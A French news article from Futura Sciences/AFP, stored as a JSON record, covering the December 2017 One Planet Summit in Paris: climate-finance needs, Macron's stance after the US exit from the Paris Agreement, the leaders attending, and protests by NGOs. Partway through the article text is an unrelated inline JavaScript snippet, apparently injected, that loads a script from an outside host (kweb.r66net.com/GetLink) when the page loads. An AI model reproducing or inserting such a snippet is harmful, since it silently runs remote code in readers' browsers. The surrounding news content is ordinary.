{"title": "One Planet Summit : un sommet a Paris pour trouver de l'argent vert", "newspaper": "Futura Sciences", "author": ["Par Futura avec l'AFP"], "date_publi": "2017-12-12", "content": "Pour le deuxieme anniversaire de l'accord de Paris, le president de la Republique Emmanuel Macron a invite en France plusieurs chefs d'Etat, patrons de grandes entreprises et fonds d'investissement pour parler << finance verte >>. L'idee du  One Planet Summit  est de trouver des moyens sur le terrain economique pour soutenir les transitions energetiques. C'est aussi une operation politique. << Le defi est immense. Nous devons tout faire pour le relever >> , a declare le Premier ministre fidjien Frank Bainimarama, president de la 23 e  Conference de l'ONU sur le  climat  (la  COP 23  a eu lieu a Bonn en novembre 2017), insistant sur l'importance des financements publics et prives, a l'ouverture de la reunion organisee a Paris et intitulee  One Planet Summit . Le president francais Emmanuel Macron a lance l'idee du sommet apres l'annonce par Donald Trump du retrait americain du pacte historique de 2015 contre le  rechauffement climatique , signe lors de la  COP 21 . Quelques heures avant l'ouverture de la reunion, le chef de l'Etat francais a de nouveau interpelle, dans une interview a la chaine americaine CBS, son homologue americain sur sa  << responsabilite face a l'histoire >> , tout en se disant  << assez certain >>  que Donald Trump  << va changer d'avis dans les mois ou les annees a venir >> . \" Il faudra 3.500 milliards de dollars chaque annee pendant 30 ans. L'accord vise a contenir la hausse de la temperature sous le  seuil critique de 2 degC , mais, sur la base des engagements pris par les Etats, la planete se dirige toujours vers +3 degC par rapport a l'ere preindustrielle. Deja, une hausse de moins de 1 degC a suffi a provoquer davantage de  precipitations , le retrecissement de la  banquise  et l'augmentation du niveau moyen des oceans. Pour reduire les  gaz a effet de serre  et atteindre les objectifs, il faudra des investissements massifs.  << L'Agence internationale de l' energie  estime qu'il faudra en moyenne 3.500 milliards de dollars (d'investissements dans le secteur energetique) chaque annee pendant 30 ans pour contenir l'augmentation des temperatures a un minimum de 2 degC >> , a souligne le president de la  Banque mondiale  Jim Yong Kim juste avant ce  One Planet Summit . L'argent est le nerf de la guerre. Il faut des milliards de dollars par an pour changer notre rapport a la planete. Certains ont d'autres idees. Jadav << Molai >> Payeng, un Indien vivant sur l'ile Majuli, y plante des arbres depuis 1980, jusqu'a creer une veritable foret. Sa notoriete est devenue mondiale. En 2014, le documentaire  Forest Man , de William Douglas McMaster, a ete prime au festival de Cannes. L'auteur l'a mis a disposition sur YouTube. Le voici ici. Il est aussi possible de lire ou relire  L'Homme qui plantait des arbres , de Jean Giono, ou encore d'en regarder la superbe version en animation de Frederic Back. (c) William Douglas McMaster, YouTube Aux Etats-Unis, on s'engage pour le climat Une soixantaine de chefs d'Etat et de gouvernement sont annonces sur l'ile Seguin, a l'ouest de Paris, dont le Mexicain Enrique Pena Nieto, le roi du Maroc Mohammed VI, des presidents africains et de petites iles vulnerables au rechauffement, ainsi que le president de la Commission europeenne Jean-Claude Juncker et le secretaire general de l'ONU Antonio Guterres. Mais la Chine, l'Inde et le Canada, grands emetteurs de  gaz a effet de serre , ne doivent etre representes qu'au niveau ministeriel, et les Etats-Unis, dont le president n'etait pas invite, par un charge d'ambassade, alors que les inquietudes sont grandes, Washington n'ayant, par exemple, verse qu'un milliard de dollars sur les trois promis au Fonds vert de l'ONU.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  << Cela n'a pas d'importance que Donald Trump ait tourne le  dos  a l'accord de Paris >> , a assure lundi l'ancien gouverneur de Californie Arnold Schwarzenegger, insistant sur l'engagement des Americains a tous les autres niveaux.  << Personne n'a laisse tomber  [...]  Nous, au niveau subnational, nous allons prendre le relais >> , a insiste le fondateur du R20, reseau d'autorites regionales. D'autres Americains ont fait le deplacement, comme l'ancien maire de New York Michael Bloomberg, le gouverneur de Californie Jerry Brown, le milliardaire  Bill Gates  ou encore l'acteur Sean Penn. Quelques vedettes sur le perron de l'Elysee. Saurez-vous reconnaitre Bill Gates, Michael Bloomberg et Richard Branson ? (c) Christophe Archambault, AFP                               A la recherche d'idees concretes Les pays du Nord ont promis de porter a 100 milliards de dollars par an d'ici 2020 leurs financements climat aux pays du Sud, qui reclament des assurances sur cette promesse, en particulier pour pouvoir s'adapter aux impacts des  dereglements  (digues, surelevation des habitats, systeme d'alerte  meteo , etc.).  << La piece manquante du puzzle est le financement pour aider les pays les plus pauvres a avoir acces a une energie propre, pour qu'ils ne suivent pas le chemin du monde riche qui marche aux  energies fossiles  >> , a commente Mohamed Adow, de l'ONG Christian Aid. Mais le sommet de mardi n'est pas une conference des donateurs, insiste la presidence francaise qui evoque des  << solutions concretes >>  pour  << multiplier les projets sur le terrain >> . Parmi les engagements qui pourraient etre annonces : des dons de fondations, des coalitions pour la  neutralite carbone  ou contre le  charbon . Pour trouver d'autres sources de financement, plusieurs ministres francais ont appuye l'idee d'une taxe europeenne sur les transactions financieres, projet au point mort apres des annees de discussions. Munies de pancartes  << Une France exemplaire >> ,  <<  OGM  non merci >> , pres de 200 personnes se sont rassemblees devant le Pantheon, a Paris, en marge du sommet, a l'appel de plusieurs associations. Pour Attac France, la France ne doit pas verser  << un euro de plus pour les energies fossiles >> . L'ONG 350.org a, elle, denonce un sommet qui est  << une operation de communication pour Emmanuel Macron >> . ", "theme": "planete"}